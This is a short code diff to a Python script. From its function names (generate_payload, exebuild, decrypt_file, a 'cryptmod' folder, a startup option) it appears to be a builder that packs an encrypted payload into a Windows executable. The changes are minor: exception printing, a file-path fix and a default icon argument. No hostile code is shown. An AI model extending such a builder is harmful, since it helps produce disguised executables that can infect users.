@@ -43,7 +43,8 @@ def exebuild(target, include, output, icon="icon.ico"):
             }]
 
         )
-    except:
+    except Exception as e:
+        print(e)
         print("...")
     if os.path.exists(f"{output}.exe"):
         os.remove(f"{output}.exe")
@@ -73,13 +74,13 @@ def decrypt_file(filename: str):
 def gendie(filenames: list):
     for name in filenames:
         try:
-            os.remove(f"cryptmod\\{name}.py")
+            os.remove(f"{name}.py")
         except Exception as err:
             os.remove(f"{name}.exe")
     return 0
 
 
-def generate_payload(filename, destname, startup, icon):
+def generate_payload(filename, destname, startup, icon="icon.ico"):
     payload = get_payload(filename)
     exepayload = exe_bytes(startup)
     start_str = "startups='" + str(startup) + "'\n"
